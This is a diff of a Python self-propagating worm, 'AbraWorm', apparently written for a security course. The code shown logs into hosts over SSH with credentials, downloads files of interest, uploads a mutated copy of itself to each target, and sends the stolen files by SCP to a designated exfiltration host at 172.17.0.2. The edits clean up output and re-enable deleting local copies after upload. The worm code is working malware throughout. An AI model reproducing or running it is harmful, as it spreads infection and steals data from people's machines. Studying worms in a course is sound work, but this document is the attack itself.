@@ -121,7 +121,7 @@ def mutate(filename):
             lines.insert(rand_num, random_string)
 
         # create a new file and write the new code into it so that we don't overwrite the original file
-        with open("AbraWorm_2.py", 'w') as new_file:
+        with open("AbraWorm.py", 'w') as new_file:
             for line in lines:
                 new_file.write(line + "\n")
             new_file.close()
@@ -217,7 +217,7 @@ while True:
                     ssh = paramiko.SSHClient()
                     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
-                    print("\n\nconnected\n")
+                    print("\nconnected")
                     # Let's make sure that the target host was not previously 
                     # infected:
                     received_list = error = None
@@ -226,7 +226,7 @@ while True:
                     if error: 
                         print(error)
                     received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
-                    print("\n\noutput of 'ls -R' command: %s" % str(received_list))
+                    print("\noutput of 'ls -R' command: %s" % str(received_list))
                     # if ''.join(received_list).find('AbraWorm') >= 0: 
                     #     print("\nThe target machine is already infected\n")      
                     #     continue
@@ -242,22 +242,22 @@ while True:
                     received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                     for item in received_list:
                         files_of_interest_at_target.append(item.strip())
-                    print("\nFiles of interest at the target: %s" % str(files_of_interest_at_target))
+                    print("Files of interest at the target: %s" % str(files_of_interest_at_target))
                     scpcon = scp.SCPClient(ssh.get_transport())
                     # Download the files of interest from the target host
                     if len(files_of_interest_at_target) > 0:
                         for target_file in files_of_interest_at_target:
                             scpcon.get(target_file)
-                            print("\nDownloaded %s from the target host\n" % target_file)
+                            print("Downloaded %s from the target host" % target_file)
                     # Now deposit a copy of AbraWorm.py at the target host:
                     # first we change the AbraWorm.py file so that no two copies are same
                     new_file = mutate(sys.argv[0])
                     new_file = new_file.name
                     scpcon.put(new_file)
-                    print("\nUploaded %s to the target host\n" % new_file)
+                    print("Uploaded %s to the target host" % new_file)
                     scpcon.close()
                 except:
-                    print("\n\nException: Could not upload copy of AbraWorm.py to host\n")
+                    print("Exception: Could not upload copy of AbraWorm.py to host")
                     continue
                 # Now upload the exfiltrated files to a specially designated host,
                 # which can be a previously infected host.  The worm will only 
@@ -266,7 +266,7 @@ while True:
                 # used on those hosts to its human masters through, say, a 
                 # secret IRC channel. (See Lecture 29 on IRC)
                 if len(files_of_interest_at_target) > 0:
-                    print("\nWill now try to exfiltrate the files")
+                    print("Will now try to exfiltrate the files")
                     try:
                         ssh = paramiko.SSHClient()
                         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -274,19 +274,19 @@ while True:
                         #  credentials in the next statement:
                         ssh.connect('172.17.0.2',port=22,username='root',password='mypassword',timeout=5)
                         scpcon = scp.SCPClient(ssh.get_transport())
-                        print("\nConnected to exhiltration host\n")
+                        print("Connected to exfiltration host")
                         for filename in files_of_interest_at_target:
                             filename = filename.decode('utf-8')
                             filename = filename.split("/")[-1]
-                            print("\nUploading %s to the exfiltration host" % filename)
+                            print("Uploading %s to the exfiltration host" % filename)
                             scpcon.put(filename)
-                            # try:
-                            #     os.remove(filename)
-                            #     print("Upload done so deleting %s from this device successfully.", filename)
-                            # except FileNotFoundError:
-                            #     print("Exception: File not found. Unable to delete.")
-                            # except Exception as e:
-                            #     print(f"Exception: An error occurred while deleting the file: {e}")
+                            try:
+                                os.remove(filename)
+                                print("Upload done so deleting %s from this device successfully.", filename)
+                            except FileNotFoundError:
+                                print("Exception: File not found. Unable to delete.")
+                            except Exception as e:
+                                print(f"Exception: An error occurred while deleting the file: {e}")
                         scpcon.close()
                     except: 
                         print("\nNo uploading of exfiltrated files\n")
